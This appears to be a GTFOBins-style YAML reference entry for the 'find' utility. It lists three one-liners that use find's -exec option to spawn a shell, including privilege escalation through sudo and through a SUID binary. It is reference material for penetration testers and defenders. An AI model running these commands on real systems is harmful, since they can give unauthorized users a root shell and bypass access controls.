---
functions:
  execute-interactive:
    - code: find . -exec /bin/sh \; -quit
  sudo-enabled:
    - code: sudo find . -exec /bin/sh \; -quit
  suid-enabled:
    - code: ./find . -exec /bin/sh -p \; -quit
---
